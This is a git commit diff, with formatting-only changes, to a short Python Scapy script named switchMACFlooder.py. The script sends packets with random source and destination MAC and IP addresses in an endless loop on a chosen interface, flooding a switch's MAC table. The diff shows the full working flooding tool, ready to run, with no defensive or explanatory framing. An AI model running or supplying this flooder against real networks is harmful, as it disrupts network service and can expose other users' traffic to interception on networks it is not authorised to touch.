37191f2a4f90c15f07f1c46aa1715c59180547ca
Piotr Kiljanek <kiljanek2005@gmail.com>
2019-09-27 12:46:13 +0200

    Update switchMACFlooder.py

--- SEC/switchMACFlooder.py
+++ SEC/switchMACFlooder.py
@@ -3,16 +3,14 @@
 import sys
 from scapy.all import *
 
-packet = Ether(src=RandMAC("*:*:*:*:*:*"),
-          dst=RandMAC("*:*:*:*:*:*")) / \
-         IP(src=RandIP("*.*.*.*"),
-          dst=RandIP("*.*.*.*")) / \
+packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / \
+         IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
          ICMP()
          
 if len(sys.argv) < 2:
-  dev = "eth0"
+          dev = "eth0"
 else:
-  dev = sys.argv[1]
+          dev = sys.argv[1]
 
 print "Flooding net with random packets on dev " + dev
 sendp(packet, iface=dev, loop=1)
